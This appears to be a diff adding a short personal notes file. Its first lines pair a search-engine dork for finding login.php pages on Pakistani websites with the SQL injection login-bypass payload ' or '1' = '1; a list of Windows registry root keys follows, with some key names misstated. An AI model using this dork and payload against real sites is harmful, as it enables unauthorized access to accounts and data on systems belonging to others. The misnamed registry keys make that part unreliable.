@@ -1,0 +1,8 @@
+websites = inurl /login.php site:*.pk
+username password both =1' or '1' = '1
+
+HKEY_CURRENT_ROOT = 
+HKEY_CURRENT_USER
+HKEY_LOCAL_MACHINE
+HKEY_USER
+HKEY_CURRENT_CONFIG
